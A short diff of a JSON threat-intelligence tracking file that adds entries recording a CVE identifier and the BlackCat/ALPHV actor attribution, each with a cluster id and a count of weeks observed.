         "cluster_id": "eaade871e6",
@@ -7637,6 +8092,18 @@
         "axis": "cve_ids",
         "value": "CVE-2025-3248",
         "cluster_id": "c8e0a6559d",
+        "weeks_observed": 3
+      },
+      {
+        "axis": "cve_ids",
+        "value": "CVE-2026-50656",
+        "cluster_id": "8fa37afed0",
+        "weeks_observed": 3
+      },
+      {
+        "axis": "actor_attribution",
+        "value": "BlackCat/ALPHV",
+        "cluster_id": "7cdd398efc",
         "weeks_observed": 3
       }
     ],
